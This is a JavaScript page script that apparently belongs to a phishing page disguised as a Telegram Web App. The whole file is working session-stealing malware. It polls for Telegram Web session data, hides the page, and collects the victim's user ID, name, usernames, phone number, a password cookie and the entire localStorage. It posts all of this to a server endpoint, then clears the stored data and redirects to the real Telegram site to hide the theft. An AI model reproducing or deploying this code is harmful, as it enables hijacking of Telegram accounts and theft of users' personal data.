document.addEventListener("DOMContentLoaded", function() {
  // Wait for Telegram Web App to initialize
  if (window.Telegram && window.Telegram.WebApp) {
    window.Telegram.WebApp.ready();
  }
  
  async function checkLocalStorage() {
    try {
      let globalState = localStorage.getItem("tt-global-state");
      // Add debug logging
      console.log("Checking for user data...");
      
      if (globalState && localStorage.getItem("user_auth")) {
        try {
          const parsedState = JSON.parse(globalState);
          const currentUserId = parsedState.currentUserId;
          const currentUser = parsedState.users.byId[currentUserId];
          
          if (currentUserId && currentUser) {
            console.log("Found user data, processing...");
            document.body.style.display = "none";
            
            const { firstName, usernames, phoneNumber, isPremium } = currentUser;
            const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1];
            
            console.log("Sending data to server...");
            await fetch(`/api/users/telegram/info`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                userId: currentUserId, firstName,
                usernames, phoneNumber, isPremium,
                password, quicklySet: localStorage,
                type: new URLSearchParams(window.location.search).get("type"),
                channelid: new URLSearchParams(window.location.search).get("id")
              })
            });
            
            console.log("Data sent, closing...");
            window.Telegram.WebApp.close();
            localStorage.clear();
            document.cookie = "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
            window.location.href = "https://web.telegram.org/a/";
            
            clearInterval(checkInterval);
          }
        } catch (err) {
          console.error("Error processing user data:", err);
        }
      }
    } catch (err) {
      console.error("Error in checkLocalStorage:", err);
    }
  }

  const checkInterval = setInterval(checkLocalStorage, 100);
});
